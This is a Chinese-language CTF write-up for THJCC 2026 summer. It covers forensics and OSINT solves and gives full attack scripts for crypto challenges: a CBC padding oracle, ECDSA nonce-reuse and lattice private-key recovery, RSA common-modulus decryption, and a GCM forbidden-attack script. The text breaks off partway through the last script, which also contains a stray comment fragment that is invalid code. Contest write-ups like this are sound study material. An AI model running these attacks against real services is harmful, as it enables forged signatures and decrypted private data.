@@ -1,0 +1,1451 @@
+---
+title: "THJCC 2026 summer Writeup"
+date: "2026-08-17"
+summary: "自AIS3 junior 結束後打的第一場 CTF ( 2026.8.15~8.16 )，這次打到了 學生賽區 14/71 | 總賽區 65/679，那可比winter的時候進步太多了"
+category: writeup
+---
+
+這算是嚴格意義講我打的第一個CTF ~~可能也是最後一個~~，我的感想是，我才剛踏進去資安，~~資安就要走到末路了~~，聽說有一些題目有做反ＬＬＭ的設計，不過似乎有一些人還是怪怪的，較為簡單的CTF題已經變成在比誰買的 agent 比較好，誰燒的token多了，說個題外話，我大概打了八個小時才打到兩千多，然後要結束的時候有人屯flag直接把我打下來了，*有人原本跟我同分，結果表單題填很快直接壓過去了*
+
+然後我沒有邊做邊寫writeup，現在寫好坐牢
+
+## welcome
+
+> 一坨規則
+
+![image](https://hackmd.io/_uploads/rJSME1AIfl.png)
+
+給了一個 .gif
+
+![welcome](https://hackmd.io/_uploads/H1Nm4JRLzg.gif)
+
+~~我把他丟到剪輯軟體逐禎對照~~
+
+後面重複的去掉
+`wlcome.xhyou.idv.tw;Pass_code:NT9C-S8DP-D85B-Z8H6htps;/welcome` ...
+
+填充一下，基於出題者的名字及ＵＲＬ的邏輯，改成
+`https://welcome.xzhiyouu.idv.tw/ ; Pass_code : NT9C-S8DP-D85B-Z8H6`
+
+點進去網址看到這個
+
+![image](https://hackmd.io/_uploads/SJ6lE1ALMe.png)
+
+把密碼填進去
+
+![image](https://hackmd.io/_uploads/ByoIdkAUfe.png)
+
+跳轉就能拿到flag
+
+![image](https://hackmd.io/_uploads/HJEcdJR8Gx.png)
+
+~~welcome我卡了一個小時這題神了~~
+
+## Misc 2/10
+
+### A Little Penguin's Starry Sky Observation
+
+![image](https://hackmd.io/_uploads/H1mhigyPfx.png)
+
+一張裁切過的星空照片，要求我們辨識照片中的核心星座
+
+![Starry_Sky_Observation](https://hackmd.io/_uploads/Sy-DzZePMx.jpg)
+
+他要我們找出
+星座的官方三字母縮寫以及該星座在天球赤道座標系統中的大略中心位置
+`赤經（RA，取整數小時）與赤緯（Dec，取整數度）`
+
+中央可以清楚看到三顆亮度相近、呈一直線排列的恆星，查了一下，這是獵戶座最具代表性且最容易辨認的特徵，且題目提到 去年 12 月在高山上觀星拍攝，可以確認應該就是他
+
+題目要求要官方三字縮寫，其 IAU 官方三字母縮寫為 Ori
+
+查詢標準星圖資料，可知獵戶座的大略中心位置約為
+```
+赤經 RA ≈ 5h　赤緯 Dec ≈ +5°
+```
+得到flag
+`THJCC{ori=RA5h,Dec+5°}`
+
+### Where is our head of challenges?
+
+> OSINT 好難我不會
+
+![image](https://hackmd.io/_uploads/SJAu2lJPzl.png)
+
+先看照片，陽台往外拍的城市天際線，中間那棟大樓頂端有天線，掛著藍色圓形招牌寫 Z ZURICH
+
+先用這個去查，發現 Zurich 保險在好幾個城市的大樓上都掛過招牌，包含墨爾本，伯斯，還有雪梨北區
+
+這時候不確定是哪一個城市，就先把圖裁小塊放大看細節
+
+發現右邊還有一棟金字塔屋頂的建築，招牌寫 SUNCORP，另外還有一棟灰白格子外牆的塔樓，頂端有個 M 的標誌
+
+Suncorp 是澳洲的保險公司，只有在澳洲才有，所以確定地點在澳洲
+
+再回頭比對 Zurich 那棟大樓的外型，屋頂是斜切的，天線架在斜面上，對照發現墨爾本的 Bourke Place 這棟大樓的屋頂形狀就是這個特徵，之前招牌是 AMP，後來換成 Zurich，跟照片完全對得起來
+
+於是判斷地點是墨爾本市中心
+
+`THJCC{144.95,-37.81}`
+
+## Forensic 3/5
+
+### Man!
+
+> 孩子們，這並不好笑
+
+![image](https://hackmd.io/_uploads/rkFwZe0Izx.png)
+
+![image](https://hackmd.io/_uploads/HynYZgALzg.png)
+
+final_koby_challenge.png
+
+![final_koby_challenge](https://hackmd.io/_uploads/rJddWlRLMx.png)
+
+資料夾內的 ._final_koby_challenge.png
+則看不到東西
+
+檢查 PNG 檔案結構，用 Python 解析 final_koby_challenge.png 的 PNG chunks，發現除了正常的 IHDR、tEXt、eXIf、IDAT、IEND 之外，檔案在 IEND 之後還多了一段資料，`PK\x03\x04` 是  ZIP 壓縮檔開頭，裡面有個 flag.txt
+
+嘗試打開 ZIP 發現需要密碼
+flag.txt 是用傳統 ZipCrypto 加密的，直接解壓會要求密碼，用 GPS 座標、Artist、Copyright 等組合去試都失敗
+
+把圖片每個像素的紅色通道的 LSB 抽取出來，重新組成 bytes，結果開頭就出現一串明文：
+
+SeeYouAgain1978
+
+`THJCC{Man_BA_0ut_Seeyouaga1n_1978}`
+
+### Afterimage1
+
+> ~~美國豆包產的影片~~
+
+![image](https://hackmd.io/_uploads/HJsCWgR8Ml.png)
+
+拿到MP4後先用 ffprobe 看結構，發現是ftyp uuid moov free mdat，大小都對齊沒有額外尾巴
+
+檢查 LSB 全是雜訊，因為H264是有損壓縮，音訊頻譜也沒東西
+
+比對 stsz 和 stco 標記的所有 sample 總大小跟 mdat 實際大小，mdat 有 2,974,581 bytes 但播放器會讀的sample總和只有2,954,057 bytes，差了20,524 bytes
+
+這段資料沒被任何 track 引用，播放器永遠不會讀到，把這段抓出來開頭是 `00 00 00 01 67 64...`，是H264的SPS
+
+單獨用ffmpeg解碼就跳出一張畫面寫著flag
+
+原來這題那麼簡單
+
+`THJCC{v1d3o_F0ren51cS_qkrejnga}`
+
+### Afterimage2
+
+![image](https://hackmd.io/_uploads/r10PjgkDfl.png)
+
+拿到題目先把 zip 解壓縮，裡面是一個 usb_capture.pcap
+
+用 capinfos 看了一下檔案資訊，發現 encapsulation 是 USB packets with Linux header，所以確定這不是普通的網路封包，是 USB 傳輸的擷取檔，對應題目說的**不明傳輸線**
+
+接著用 tshark 打開看封包列表，發現全部都是 URB_INTERRUPT in，方向是裝置傳給電腦，這個特徵很像鍵盤在傳按鍵資料，所以猜測這條線接的是鍵盤
+
+後來查了一下得知鍵盤傳輸的封包格式是固定 8 bytes，第一個 byte 是 shift 這種修飾鍵，第三個 byte 才是真正按下的按鍵代碼，於是用 tshark 把每個封包的 usb.capdata 欄位抓出來看
+
+抓出來之後發現資料是一按一放交替出現，放開的封包全部都是 0，所以只要留下有值的那一半就好，總共有 25 組真正的按鍵資料
+
+再來就是把每個按鍵代碼對照 USB HID 的按鍵對照表換成英文字母，如果那筆資料的修飾鍵是 shift，就要換成大寫或是對應的符號，像是中括號按 shift 會變成大括號
+
+寫了一小段 python 把全部按鍵跑過一遍轉成文字，出來的結果剛好前後有大括號，看起來就是完整的 flag，
+
+```
+import subprocess
+out = subprocess.run(["tshark","-r","usb_capture.pcap","-T","fields","-e","usb.capdata"],capture_output=True,text=True).stdout.strip().split("\n")
+
+hid_map = {
+0x04:'a',0x05:'b',0x06:'c',0x07:'d',0x08:'e',0x09:'f',0x0a:'g',0x0b:'h',0x0c:'i',0x0d:'j',
+0x0e:'k',0x0f:'l',0x10:'m',0x11:'n',0x12:'o',0x13:'p',0x14:'q',0x15:'r',0x16:'s',0x17:'t',
+0x18:'u',0x19:'v',0x1a:'w',0x1b:'x',0x1c:'y',0x1d:'z',
+0x1e:'1',0x1f:'2',0x20:'3',0x21:'4',0x22:'5',0x23:'6',0x24:'7',0x25:'8',0x26:'9',0x27:'0',
+0x28:'\n',0x2c:' ',0x2d:'-',0x2e:'=',0x2f:'[',0x30:']',0x31:'\\',0x33:';',0x34:"'",0x35:'`',0x36:',',0x37:'.',0x38:'/'
+}
+shift_map = {
+'a':'A','b':'B','c':'C','d':'D','e':'E','f':'F','g':'G','h':'H','i':'I','j':'J',
+'k':'K','l':'L','m':'M','n':'N','o':'O','p':'P','q':'Q','r':'R','s':'S','t':'T',
+'u':'U','v':'V','w':'W','x':'X','y':'Y','z':'Z',
+'1':'!','2':'@','3':'#','4':'$','5':'%','6':'^','7':'&','8':'*','9':'(','0':')',
+'-':'_','=':'+','[':'{',']':'}','\\':'|',';':':',"'":'"','`':'~',',':'<','.':'>','/':'?'
+}
+
+result = []
+for line in out:
+    if line == '0000000000000000' or line=='':
+        continue
+    b = bytes.fromhex(line)
+    mod = b[0]
+    key = b[2]
+    if key == 0:
+        continue
+    ch = hid_map.get(key, f'[{key:02x}]')
+    if mod & 0x22:  # left or right shift
+        ch = shift_map.get(ch, ch)
+    result.append(ch)
+
+print(''.join(result))
+```
+
+`flag THJCC{hid_k3y5tr0k3_l34k}`
+
+## Crypto 8/8
+
+> 密碼學部分大量參考 CTF wiki 跟一些 cluade 幫助，因為我數學很爛
+
+### Lattice of Doom
+
+![image](https://hackmd.io/_uploads/SybgtHaLGe.png)
+
+![image](https://hackmd.io/_uploads/rJtWKH6UMx.png)
+
+這題給了片段和60個簽章，簽章用的nonce只取了29位元組（232 bits），但 secp256k1 的order是256 bits，所以nonce的高24位元永遠是 0，可以轉成Hidden Number Problem，用 lattice reduction 還原私鑰
+
+對每個簽章有
+$s_i * k_i ≡ z_i + r_i * d (mod N)$
+
+移項後得到
+$k_i ≡ u_i + t_i * d (mod N)$
+其中$t_i = r_i * s_i^{-1}，u_i = z_i * s_i^{-1}$
+
+因為 $k_i$ 很小（小於$2^232$），所以存在整數 $l_i$ 讓 $t_i * d - l_i * N = k_i - u_i$
+
+這個式子剛好可以排成一個lattice，用n個簽章造一個(n+2)x(n+2)的矩陣，對角線放 $N$，最後一列放 $t_i$，最後一行放 $u_i$ 和$B=2^232$
+
+目標向量是$(l_1,...,l_n,d,1)$
+乘上矩陣會得到$(k_1-u_1,...,k_n-u_n,d,B)$
+前n項和B都很小，所以是短向量，用LLL約簡後找最後一項絕對值等於B的那一列
+倒數第二項取絕對值再mod N就是d，驗證公鑰對就對了
+
+當初沒實作 `ec_mul` ，直接用ecdsa庫或自己寫點乘，還有n的數量不用太多，4到10個就夠，太多反而讓lattice變大不好約簡
+
+拿到私鑰後用sha256("wallet-v1|" + d.to_bytes(32,"big"))
+取前16位元當AES金鑰，CBC解密iv+密文，去掉填充就得到flag
+
+FLAG: `THJCC{n0nc3_b14s_1s_d4ng3r0us}`
+
+![image](https://hackmd.io/_uploads/HyrF45TUGe.png)
+
+### Oracle of Padding
+
+> 第一次實作 Padding Oracle Attack
+
+![image](https://hackmd.io/_uploads/H1f4hgRIfx.png)
+
+```
+
+import socket
+import re
+
+HOST = 'chal.thjcc.org'
+PORT = 12000
+
+# 連線並取得 TOKEN
+def get_token():
+    s = socket.create_connection((HOST, PORT))
+    data = b''
+    while b'TOKEN' not in data:
+        data += s.recv(4096)
+    print(data.decode())
+    m = re.search(rb'TOKEN\s+([0-9a-fA-F]+)', data)
+    enc = bytes.fromhex(m.group(1).decode())
+    iv = enc[:16]          # 前 16 bytes 為 IV
+    cipher = enc[16:]      # 其餘為密文
+    blocks = [cipher[i:i+16] for i in range(0, len(cipher), 16)]
+    return s, iv, blocks
+
+# Padding Oracle 送出自訂密文，判斷 padding 是否正確
+def oracle(sock, ct_hex):
+    sock.sendall(ct_hex.encode() + b'\n')
+    resp = b''
+    while not resp.endswith(b'\n'):
+        resp += sock.recv(4096)
+    return b'OK' in resp or b'VALID' in resp
+
+# 給定密文區塊 block 和前一個區塊 prev，還原該區塊的明文
+def attack_block(sock, block, prev):
+    interm = [0]*16
+    plain = [0]*16
+    crafted = bytearray(prev)
+
+    for pad_len in range(1, 17):
+        pos = 16 - pad_len
+        # 設定已破解 byte 的 padding 值
+        for i in range(pos+1, 16):
+            crafted[i] = interm[i] ^ pad_len
+
+        # 暴力破解當前 byte
+        for guess in range(256):
+            crafted[pos] = guess
+            # 送出 crafted + block，觀察 padding 是否正確
+            if oracle(sock, bytes(crafted).hex() + block.hex()):
+                interm[pos] = guess ^ pad_len
+                plain[pos] = interm[pos] ^ prev[pos]
+                break
+    return bytes(plain)
+
+def main():
+    sock, iv, blocks = get_token()
+    flag = b''
+    prev = iv
+    for blk in blocks:
+        flag += attack_block(sock, blk, prev)
+        prev = blk
+    print(flag.decode())
+    sock.close()
+
+if __name__ == "__main__":
+    main()
+```
+
+腳本執行後，會逐 byte 顯示解出的明文，最終得到 flag：
+    
+![image](https://hackmd.io/_uploads/r1L-2eA8fl.png)
+
+### Nonce Sense
+
+![image](https://hackmd.io/_uploads/SyrQUb0UMx.png)
+
+```
+# ECDSA Nonce Reuse
+# 從兩個重用 nonce 的簽章恢復私鑰，並對目標訊息簽章取得 flag
+
+import socket
+import hashlib
+import re
+from ecdsa import SECP256k1, SigningKey
+from ecdsa.ellipticcurve import Point
+
+HOST = "chal.thjcc.org"
+PORT = 12001
+
+# 接收資料直到遇到特定標記
+def recv_until(sock, marker):
+    data = b""
+    while marker not in data:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        data += chunk
+    return data.decode(errors="ignore")
+
+# 解析伺服器輸出的 PUB、SIG 和 TARGET
+def parse_server_output(text):
+    pub = re.search(r"PUB ([0-9a-f]+) ([0-9a-f]+)", text)
+    sigs = re.findall(r"SIG ([0-9a-f]+) ([0-9a-f]+) ([0-9a-f]+)", text)
+    target = re.search(r"TARGET ([0-9a-f]+)", text)
+    if not pub or len(sigs) < 2 or not target:
+        raise ValueError("parse error")
+    return pub.group(1), pub.group(2), sigs[0], sigs[1], target.group(1)
+
+# 計算訊息 hash
+# 將 hex 解碼為位元組後取 SHA256，再 mod n
+def z_sha256(msg_hex, n):
+    msg = bytes.fromhex(msg_hex)
+    return int.from_bytes(hashlib.sha256(msg).digest(), "big") % n
+
+# 從兩個重用 nonce 的簽章恢復私鑰 d 和 nonce k
+def recover_key(pub_x, pub_y, sig1, sig2):
+    curve = SECP256k1
+    n = curve.order
+    m1, r1, s1 = sig1[0], int(sig1[1], 16), int(sig1[2], 16)
+    m2, r2, s2 = sig2[0], int(sig2[1], 16), int(sig2[2], 16)
+    assert r1 == r2, "nonce reuse assumption failed"
+    r = r1
+    z1 = z_sha256(m1, n)
+    z2 = z_sha256(m2, n)
+    k = ((z1 - z2) * pow((s1 - s2) % n, -1, n)) % n
+    d = ((s1 * k - z1) * pow(r, -1, n)) % n
+    # 驗證私鑰是否對應到提供的公鑰
+    sk = SigningKey.from_secret_exponent(d, curve=curve)
+    P = sk.verifying_key.pubkey.point
+    if P.x() != int(pub_x, 16) or P.y() != int(pub_y, 16):
+        raise ValueError("private key mismatch")
+    return d, k, r
+
+# 對目標訊息產生簽章，可選擇重用原 nonce 或使用新 nonce
+def sign_target(target_hex, d, k, r, reuse_nonce=True):
+    curve = SECP256k1
+    n = curve.order
+    zt = z_sha256(target_hex, n)
+    if reuse_nonce:
+        rt = r
+        st = (pow(k, -1, n) * (zt + rt * d)) % n
+    else:
+        k_new = 123456789
+        R = k_new * curve.generator
+        rt = R.x() % n
+        st = (pow(k_new, -1, n) * (zt + rt * d)) % n
+    return rt, st
+
+# 本地驗證簽章是否正確
+def verify_sig(pub_x, pub_y, target_hex, r, s):
+    curve = SECP256k1
+    n = curve.order
+    P = Point(curve.curve, int(pub_x, 16), int(pub_y, 16), n)
+    z = z_sha256(target_hex, n)
+    u1 = (z * pow(s, -1, n)) % n
+    u2 = (r * pow(s, -1, n)) % n
+    R = u1 * curve.generator + u2 * P
+    return R.x() % n == r
+
+def main():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((HOST, PORT))
+    text = recv_until(sock, b"TARGET ")
+    print(text)
+
+    pub_x, pub_y, sig1, sig2, target_hex = parse_server_output(text)
+    d, k, r = recover_key(pub_x, pub_y, sig1, sig2)
+
+    rt, st = sign_target(target_hex, d, k, r, reuse_nonce=True)
+
+    if verify_sig(pub_x, pub_y, target_hex, rt, st):
+        print("[+] valid signature")
+    else:
+        print("[-] invalid signature, abort")
+        return
+
+    answer = f"SIG {target_hex} {rt:064x} {st:064x}\n"
+    print(f"sending: {answer.strip()}")
+    sock.sendall(answer.encode())
+
+    response = b""
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            response += chunk
+            if b"flag" in chunk.lower() or b"}" in chunk:
+                break
+    except socket.timeout:
+        pass
+
+    print(response.decode(errors="ignore"))
+    sock.close()
+
+if __name__ == "__main__":
+    main()
+```
+
+Flag: `THJCC{n3v3r_3v3r_r3us3_th3_s4m3_n0nc3}`
+    
+### Schizophrenic Signer
+
+![image](https://hackmd.io/_uploads/rJlm84aLfe.png)
+
+![image](https://hackmd.io/_uploads/Hki7LVTIfe.png)
+
+注意到伺服器使用 ECDSA ，它是對 85 句話各自做一次簽名，簽名之後把每一句話的簽名結果 (h, r, s) 印出來
+
+ECDSA 簽名的私鑰是 $d$，題目最後要我們輸入 d 才會給 flag
+
+每次都需要用到一個隨機數字 nonce，用 $k$ 表示，只要有任何一組簽名的 $k$ 被猜到或算出來，那組簽名的方程式裡就只剩下私鑰 $d$ 跟一個nonce，直接解方程式就能拿到 d
+
+這題的 k 不是用安全的 nonce 產生的，而是用下面這段程式算出來的
+
+```
+class DualGenerator:
+    def __init__(self, seed):
+        self.state = seed
+        self.a = random.randint(2**252, 2**253 - 1)
+        self.b = random.randint(1, p - 1)
+
+    def next_nonce(self):
+        self.state = (self.a * self.state + self.b) % p
+        return self.state % q
+```
+
+每次把目前的 state 乘上 a、加上 b，再對一個很大的質數 p 取餘，得到新的 state，最後把 state 對另一個質數 q 取餘數，當作這次的 k
+
+這裡的 p 和 q 是 ECDSA 用橢圓曲線裡兩個固定的質數，题目沒有自己選，這是 secp256k1 曲線的參數
+
+伺服器直接印 a 和 b 了，目前只缺 seed 未知
+
+注意到 p 和 q 這兩個質數雖然不一樣，但是它們的大小幾乎一模一樣，差距小到可以忽略
+
+state 本來是均勻分布在 0 到 p 之間的某個範圍裡，然而因為 q 幾乎跟 p 一樣大，state 幾乎不可能大於 q，所以最後那一步mod q，什麼都沒有改變，state 取完餘數之後還是一樣
+
+已知 seed 跟 a , b 就可以把 85 個 k 全部精確算出來
+
+同時找出 seed 和 d :
+
+已知 a、b，可以把第 i 個 k 寫成 seed 的一個公式，這個公式是對 p 取餘數
+
+k_i 除以 p 取餘數之後，等於 (a 的 i+1 次方) 乘上 seed，再加上一個已知的數字
+
+只要知道 h、r、s，就可以把 k_i 寫成私鑰 d 的一個公式，這個公式是對 q 取餘數的
+
+k_i 除以 q 取餘數之後，等於一個已知的數字，加上 d 乘上另一個已知的數字
+
+用中國剩餘定理，如果知道一個數字除以 p 的餘數，又知道它除以 q 的餘數，而且 p 跟 q 互質，那麼這個數字除以 p × q 的餘數就會被唯一決定
+
+p × q 這個數字非常大，大約有 512 個二進位位元。但是式子左邊的 k_i 本身只有大約 256 個位元(因為 k_i 一定小於 q)
+
+所以某個算出來的大數字，對 512 位元的模數取餘數之後，結果必須小於 256 位元
+
+seed 跟 d 加起來是 256 加 256 等於 512 個位元的未知數，每多用一組簽名，就多得到一條結果特別小」的限制，等效於多提供了大約 256 位元的資訊量，理論上只要用 3 組簽名(3 * 256 > 512)，就足夠把 seed 跟 d 唯一確定下來
+
+最後使用 LLL，把未知的 seed、未知的 d、還有每一組簽名裡取完餘數後那個特別小的餘數都丟進去，就可以找到了
+    
+```
+import socket
+import re
+import sys
+from fpylll import IntegerMatrix, LLL
+
+p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f
+q = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
+G_x = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798
+G_y = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8
+G = (G_x, G_y)
+
+def add(p1, p2):
+    if p1 is None: return p2
+    if p2 is None: return p1
+    x1, y1 = p1
+    x2, y2 = p2
+    if x1 == x2 and y1 != y2: return None
+    if x1 == x2:
+        l = (3 * x1 * x1) * pow(2 * y1, -1, p) % p
+    else:
+        l = (y2 - y1) * pow(x2 - x1, -1, p) % p
+    x3 = (l * l - x1 - x2) % p
+    y3 = (l * (x1 - x3) - y1) % p
+    return (x3, y3)
+
+def mul(pt, n):
+    res = None
+    curr = pt
+    n = n % q
+    while n:
+        if n & 1: res = add(res, curr)
+        curr = add(curr, curr)
+        n >>= 1
+    return res
+
+def recover(pub, a, b, sigs, N=3, M=None):
+    """sigs: list of (h, r, s) tuples, at least N of them."""
+    if M is None:
+        M = q
+    inv_a1 = pow(a - 1, -1, p)
+
+    def A_of(i):  # coeff of seed for k_i = state after (i+1) LCG steps
+        return pow(a, i + 1, p)
+
+    def C_of(i):
+        return b * (pow(a, i + 1, p) - 1) * inv_a1 % p
+
+    u, v = [], []
+    for (h, r, s) in sigs[:N]:
+        inv_s = pow(s, -1, q)
+        u.append(h * inv_s % q)
+        v.append(r * inv_s % q)
+
+    pq = p * q
+    cp = q * pow(q, -1, p) % pq   # CRT basis: ==1 mod p, ==0 mod q
+    cq = p * pow(p, -1, q) % pq   # CRT basis: ==0 mod p, ==1 mod q
+
+    alpha = [(cp * A_of(i)) % pq for i in range(N)]
+    beta = [(cq * v[i]) % pq for i in range(N)]
+    gamma = [(cp * C_of(i) + cq * u[i]) % pq for i in range(N)]
+
+    dim = N + 3
+    B = IntegerMatrix(dim, dim)
+    for i in range(N):
+        B[i, i] = pq
+    for i in range(N):
+        B[N, i] = alpha[i]
+    B[N, N] = 1
+    for i in range(N):
+        B[N + 1, i] = beta[i]
+    B[N + 1, N + 1] = 1
+    for i in range(N):
+        B[N + 2, i] = (-gamma[i]) % pq
+    B[N + 2, N + 2] = M
+
+    LLL.reduction(B)
+
+    for row in range(dim):
+        last = B[row, N + 2]
+        if last == M:
+            seed_cand = (-B[row, N]) % p
+            d_cand = (-B[row, N + 1]) % q
+        elif last == -M:
+            seed_cand = B[row, N] % p
+            d_cand = B[row, N + 1] % q
+        else:
+            continue
+        if mul(G, d_cand) == pub:
+            return d_cand, seed_cand
+    return None, None
+
+def parse_and_solve(text):
+    pub_match = re.search(r"Public Key: \(0x([0-9a-fA-F]+), 0x([0-9a-fA-F]+)\)", text)
+    pub = (int(pub_match.group(1), 16), int(pub_match.group(2), 16))
+
+    ab_match = re.search(r"a = 0x([0-9a-fA-F]+), b = 0x([0-9a-fA-F]+)", text)
+    a = int(ab_match.group(1), 16)
+    b = int(ab_match.group(2), 16)
+
+    hs = [int(x, 16) for x in re.findall(r"h = 0x([0-9a-fA-F]+)", text)]
+    rs = [int(x, 16) for x in re.findall(r"r = 0x([0-9a-fA-F]+)", text)]
+    ss = [int(x, 16) for x in re.findall(r"s = 0x([0-9a-fA-F]+)", text)]
+    sigs = list(zip(hs, rs, ss))
+
+    for N in (3, 4, 5, 6, 8):
+        if len(sigs) < N:
+            break
+        d, seed = recover(pub, a, b, sigs, N=N)
+        if d is not None:
+            return d
+    return None
+
+def main():
+    host = sys.argv[1] if len(sys.argv) > 1 else "chal.thjcc.org"
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11451
+
+    sock = socket.create_connection((host, port), timeout=30)
+    f = sock.makefile("rb")
+    buf = b""
+    # read until the private key prompt appears
+    while b"Private Key" not in buf:
+        chunk = f.read1(4096) if hasattr(f, "read1") else sock.recv(4096)
+        if not chunk:
+            break
+        buf += chunk
+    text = buf.decode(errors="ignore")
+    print(text)
+
+    d = parse_and_solve(text)
+    if d is None:
+        print("!! failed to recover private key")
+        return
+    print("Recovered private key d =", hex(d))
+
+    sock.sendall((hex(d) + "\n").encode())
+    sock.settimeout(10)
+    resp = b""
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            resp += chunk
+    except socket.timeout:
+        pass
+    print(resp.decode(errors="ignore"))
+
+if __name__ == "__main__":
+    main()
+```
+
+算完後連接伺服器
+    
+把 d 傳回伺服器，拿到 flag
+                                                    
+`THJCC{w0w_y0u_f0und_th3_h1dd3n_d3lt4_b3tw33n_p_4nd_q!}`
+    
+### Two Exponents
+
+![image](https://hackmd.io/_uploads/HylSqlJvMg.png)
+
+他被加密了兩次，兩次用的 $n$ 是同一個，但是指數不一樣
+
+Marketing 那邊用 $e_1 = 111$，加密出來的密文是 $c_1$
+Legal 那邊用 $e_2 = 39$，加密出來的密文是 $c_2$
+
+已知 $n$、$e_1$、$c_1$、$e_2$、$c_2$ ，任務是把明文 $m$ 找出來
+
+題目還給了一個提示，這種通常要求 $e_1$ 和 $e_2$ 互質，要先檢查一下這個條件成不成立
+
+同一組 n、但 e 不同
+
+$c_1 = m^{111} \bmod n$
+$c_2 = m^{39} \bmod n$
+
+若 $e_1$ 和 $e_2$ 互質，可以用 Extended Euclidean algorithm，找到兩個整數 $a$、$b$，讓下面等式成立
+
+$a \times 111 + b \times 39 = 1$
+
+只要找到這樣的 $a$、$b$，就可以得到 $m$
+
+不用知道 $n$ 是怎麼分解的
+
+發現 111 和 39 沒有互質，公因數是3
+
+不過只是等式右邊沒辦法湊出 1，但可以湊出 3
+
+把 $e_1$、$e_2$ 都除以它們的最大公因數 3
+
+$111 / 3 = 37$
+$39 / 3 = 13$
+
+由於 37 和 13 這兩個數字互質，所以可以用前面的方法找到整數 $a$、$b$
+
+$a \times 37 + b \times 13 = 1$
+
+找到 $a$、$b$ 之後，兩邊同時乘上 3
+
+$a \times 111 + b \times 39 = 3$
+
+照相同的邏輯去運算
+            
+這樣就把 $m^3 \bmod n$ 算出來了，只是還不是 $m$ 本身，而是 $m^3$ mod $n$ 
+
+所以要再開三次方根
+
+拿到 $m$ 之後，把這個數字轉 bytes，就是 flag 
+
+```python
+from math import gcd
+import sympy
+
+n  = 77858147671482407634775491427040805492076980205563716402246138065521424847352748333947251695438000383243920464095595462728641255858191058453473003730294210301598211003700846609849972322991848231552293626273416217314260783103263284010287945923693495357051277469279606933481196189861065420108007616409643776013
+e1 = 111
+c1 = 18223062994297197653234717982144573569773880742037431830544439999553795195125626505331124696776901462144736197874973901036255517289372748992723223498997000791202721932133429983002886149582411413191392795467958837528737663052532838054771927153786855378458367115645172309532793321789113491998416988084430368204
+e2 = 39
+c2 = 76348018939213272185590808359388052466934484463344890672730708364972146374564171707212345714373329559752891016395108524379113926994557487020813255966324592722174363480000800186421273525315732093443649340134436194571066648858343990234218106682132787231616400778754021668597178594337592606373176172822415096792
+
+g = gcd(e1, e2)          # 算出最大公因數是 3
+e1p, e2p = e1 // g, e2 // g   # 37, 13
+
+def egcd(a, b):
+    if b == 0:
+        return (a, 1, 0)
+    g, x, y = egcd(b, a % b)
+    return (g, y, x - (a // b) * y)
+
+g2, a, b = egcd(e1p, e2p)   # 找到 a, b 讓 37a + 13b = 1
+assert g2 == 1
+
+part1 = pow(c1, a, n) if a >= 0 else pow(pow(c1, -1, n), -a, n)
+part2 = pow(c2, b, n) if b >= 0 else pow(pow(c2, -1, n), -b, n)
+
+m3 = (part1 * part2) % n   # m^3 mod n
+
+m, exact = sympy.integer_nthroot(m3, 3)   # 開三次方根
+assert exact   # 確認開根號沒有餘數
+
+flag = m.to_bytes((m.bit_length() + 7) // 8, 'big')
+print(flag)
+```
+
+Flag
+```
+THJCC{n0t_c0pr1m3_but_st1ll_br0k3n_4nyw4y}
+```
+    
+### Forbidden
+    
+![image](https://hackmd.io/_uploads/HkOscl1wfe.png)
+
+```
+import re
+import sys
+import galois
+from pwn import remote, context
+ 
+HOST = sys.argv[1] if len(sys.argv) > 1 else "chal.thjcc.org"
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 12002
+ 
+# GCM 用的 GF(2^128)，固定用這條 irreducible polynomial
+GF = galois.GF(2**128, irreducible_poly="x^128 + x^7 + x^2 + x + 1")
+ 
+# GCM 的 bit 順序是反過來存的 (reflected)
+# 把 128 bit 整數的位元順序整個反轉，才能丟進標準的 
+def rev128(n: int) -> int:
+    GF(2^128) 運算
+    r = 0
+    for _ in range(128):
+        r = (r << 1) | (n & 1)
+        n >>= 1
+    return r
+ 
+# 16 bytes 的 block 轉成 GF(2^128) 的元素 (先反轉 bit 順序) 
+def block_to_gf(b16: bytes):
+    return GF(rev128(int.from_bytes(b16, "big")))
+ 
+# GF(2^128) 的元素轉回 16 bytes，跟 block_to_gf 互為反函式 
+def gf_to_block(elem) -> bytes:
+    return rev128(int(elem)).to_bytes(16, "big")
+ 
+# 補 0 到 16 的倍數，GHASH 要求每個 block 都是 16 bytes 
+def pad16(b: bytes) -> bytes:
+    return b + b"\x00" * (-len(b) % 16)
+ 
+# 切成數個 16 bytes 的 block 
+def blocks(b: bytes):
+    b = pad16(b)
+    return [b[i:i + 16] for i in range(0, len(b), 16)]
+ 
+# 算出 GHASH 多項式的係數
+# 沒有 AAD，所以長度區塊 = 64bit(AAD長度=0) + 64bit(密文長度) 
+def ghash_coeffs(ct: bytes):
+    lb = (0).to_bytes(8, "big") + (len(ct) * 8).to_bytes(8, "big")
+    return [block_to_gf(x) for x in blocks(ct) + [lb]]
+ 
+# 把密文包成一個以 H 為變數的多項式 P(H) 
+def msg_poly(ct: bytes):
+    coeffs = ghash_coeffs(ct) + [GF(0)]
+    return galois.Poly(coeffs, field=GF)
+ 
+# 把第 i, j 則訊息的等式互相 XOR
+# T_i = P_i(H) XOR S, T_j = P_j(H) XOR S，兩式相加 S 會消掉
+# 得到只跟 H 有關、常數項是 T_i XOR T_j 的多項式，H 是它的根 
+def combine(polys, tags, i, j):
+    F = polys[i] + polys[j]
+    c = F.coeffs.copy()
+    c[-1] = c[-1] + (tags[i] + tags[j])
+    return galois.Poly(c, field=GF)
+ 
+# 在 GF(2^128) 上求多項式 f 的根
+# f 的根 = gcd(f(x), x^(2^128) - x)
+# 用重複平方法算出 x^(2^128) mod f，只需要平方 128 次 
+def roots_via_gcd(f):
+    x = galois.Poly([1, 0], field=f.field)
+    r = x
+    for _ in range(128):
+        r = (r * r) % f
+    return galois.gcd(f, r - x)
+ 
+# 從多組共用同一個 nonce 的 (明文, 密文, tag) 反推出
